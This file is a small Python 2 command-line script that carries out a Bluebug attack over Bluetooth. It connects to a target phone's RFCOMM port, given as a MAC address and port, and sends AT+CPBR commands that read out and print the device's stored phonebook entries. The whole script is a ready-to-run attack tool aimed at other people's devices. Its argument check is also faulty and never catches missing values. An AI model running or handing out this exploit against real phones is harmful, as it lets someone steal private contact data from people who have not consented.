#!/usr/bin/env python2
import bluetooth, argparse, sys, datetime


def bluebug(host,port):
    device = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
    device.connect((host, port))
    for itera in range(1,5):
        AT = ("AT+CPBR=%s\n" % str(itera))
        device.send(AT)
        res = device.recv(1024)
        print("[%s] %s: %s" % (datetime.datetime.now(), str(itera), res))
    device.close()


def getargs():
    ap = argparse.ArgumentParser(description="Bluebug exploitation.  AT command, dump contact list.  I think it needs the Obex Phonebook port.")
    ap.add_argument('-m', '--mac', type=str, default=None, help="MAC address of target device")
    ap.add_argument('-p', '--port', type=int, default=None, help="PORT of the Obex Phonebook service")
    args, l = ap.parse_known_args()
    argues = vars(args)
    if None in argues:
        ap.print_help()
        sys.exit()
    else:
        return args


def main():
    args = getargs()
    bluebug(args.mac, args.port)


if __name__=="__main__":
    main()

